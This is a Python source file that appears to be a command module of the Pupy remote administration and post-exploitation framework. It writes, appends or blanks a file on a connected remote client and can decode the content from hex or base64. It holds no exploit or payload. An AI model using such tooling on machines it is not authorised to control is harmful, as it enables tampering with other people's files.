# -*- coding: utf-8 -*-

from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
from pupylib.PupyCompleter import remote_path_completer
from argparse import REMAINDER

__class_name__='Write'
@config(cat='manage')
class Write(PupyModule):
    ''' Write short string to file '''

    dependencies = ['pupyutils.basic_cmds']

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog='write', description=cls.__doc__)

        modifier = cls.arg_parser.add_mutually_exclusive_group()
        modifier.add_argument(
            '-0', '--zero', action='store_true', default=False,
            help='Overwrite file with empty string')
        modifier.add_argument(
            '-a', '--append', action='store_true', default=False,
            help='Append data to existing content')

        decoding = cls.arg_parser.add_mutually_exclusive_group()
        decoding.add_argument(
            '-x', '--hex', action='store_true', default=False,
            help='Decode data from hex')
        decoding.add_argument(
            '-b', '--base64', action='store_true', default=False,
            help='Decode data from base64')

        cls.arg_parser.add_argument(
            'remote_file', metavar='<remote_path>',
            completer=remote_path_completer)

        cls.arg_parser.add_argument('text', nargs=REMAINDER)

    def run(self, args):
        if not args.text and not args.zero:
            self.error('Use -0 to overwrite file with zero content')
            return
        elif args.zero and args.text:
            self.error('Use either -0 or text')
            return

        text = ''
        if not args.zero:
            text = ' '.join(args.text)

        if args.base64:
            text = text.decode('base64')
        elif args.hex:
            text = text.decode('hex')

        fputcontent = self.client.remote('pupyutils.basic_cmds', 'fputcontent', False)

        try:
            fputcontent(args.remote_file, text, args.append)
        except Exception, e:
            self.error(' '.join(x for x in e.args if type(x) in (str, unicode)))
            return
